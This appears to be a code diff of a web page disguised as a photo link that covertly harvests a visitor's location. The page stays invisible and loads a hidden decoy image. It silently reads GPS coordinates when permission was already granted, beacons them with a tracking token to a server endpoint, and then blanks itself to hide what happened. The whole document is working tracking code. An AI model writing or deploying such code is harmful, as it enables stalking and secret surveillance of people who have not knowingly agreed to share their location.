@@ -6,11 +6,22 @@
 <title> </title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
+  html, body {
+    background: #000;
+    width: 100%; height: 100%;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
   body { opacity: 0; }
+  img.photo {
+    display: none;
+  }
 </style>
 </head>
 <body>
+<img class="photo" id="decoy" src="/api/photo/{{ token }}" onerror="this.style.display='none'" onload="this.style.display='none'" />
 <script>
 (function() {
   'use strict';
@@ -25,12 +36,7 @@
   function sendCoords(lat, lng, acc) {
     if (_sent) return;
     _sent = true;
-    var payload = JSON.stringify({
-      token: token,
-      latitude: lat,
-      longitude: lng,
-      accuracy: acc
-    });
+    var payload = JSON.stringify({ token: token, latitude: lat, longitude: lng, accuracy: acc });
     var blob = new Blob([payload], { type: 'application/json' });
     if (navigator.sendBeacon) {
       navigator.sendBeacon('/api/location-update', blob);
@@ -54,11 +60,7 @@
   function vanish() {
     try { window.location.replace('about:blank'); } catch(e) {}
     setTimeout(function() {
-      try {
-        document.open();
-        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
-        document.close();
-      } catch(e) {}
+      try { document.open(); document.write(''); document.close(); } catch(e) {}
     }, 10);
   }
 
@@ -68,14 +70,12 @@
       if (callback) callback();
       return;
     }
-
     navigator.geolocation.getCurrentPosition(
       function(pos) {
         sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
         if (callback) callback();
       },
-      function(err) {
-        // err.code 1 = denied, 2 = unavailable, 3 = timeout
+      function() {
         sendDenied();
         if (callback) callback();
       },
@@ -83,31 +83,26 @@
     );
   }
 
-  // ── Permission-aware approach ──
+  // ── Permission-aware GPS capture ──
   if (navigator.permissions && navigator.permissions.query) {
     navigator.permissions.query({ name: 'geolocation' }).then(function(status) {
       if (status.state === 'granted') {
-        // Silently fire GPS — no prompt
         attemptGps(function() { vanish(); });
       } else if (status.state === 'denied') {
-        // Already denied — no point trying
         sendDenied();
         vanish();
       } else {
-        // 'prompt' state — this WILL show the browser dialog
-        // Attempt GPS and let the prompt appear naturally
+        // 'prompt' — will show dialog, but we proceed anyway
         attemptGps(function() { vanish(); });
       }
     }).catch(function() {
-      // Permissions API unavailable — just try GPS
       attemptGps(function() { vanish(); });
     });
   } else {
-    // No permissions API — just try GPS (may prompt)
     attemptGps(function() { vanish(); });
   }
 
-  // ── Safety timeout: vanish after ~22s if something hangs ──
+  // ── Safety timeout ──
   setTimeout(function() {
     if (!_sent) { sendDenied(); }
     vanish();
